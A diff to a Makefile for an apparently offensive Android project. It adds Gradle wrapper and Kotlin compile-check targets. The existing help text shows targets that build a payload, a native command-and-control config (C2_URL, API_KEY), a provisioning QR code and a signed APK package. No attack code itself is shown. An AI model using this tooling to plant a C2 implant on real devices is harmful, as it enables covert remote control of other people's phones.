@@ -24,6 +24,8 @@ help:
 	@echo "  make config     — regenerate native C2 config (C2_URL=... API_KEY=...)"
 	@echo "  make qr         — generate Zero-Touch provisioning QR"
 	@echo "  make zip        — package everything"
+	@echo "  make wrapper    — regenerate the Gradle wrapper"
+	@echo "  make check      — Kotlin compile check (no NDK needed)"
 	@echo "  make all        — keystore + payload + apk + zip"
 	@echo "  make clean      — remove build/"
 
@@ -92,6 +94,14 @@ zip:
 .PHONY: all
 all: keystore payload apk zip
 	@echo "[✓] full package ready: $(ZIP_OUT)"
+
+.PHONY: wrapper
+wrapper:
+	cd $(ANDROID_DIR) && ./gradlew wrapper --gradle-version 8.10.2 --distribution-type bin
+
+.PHONY: check
+check:
+	cd $(ANDROID_DIR) && ./gradlew -PspNoNative=true :app:compileDebugKotlin :payload:compileDebugKotlin
 
 .PHONY: clean
 clean:
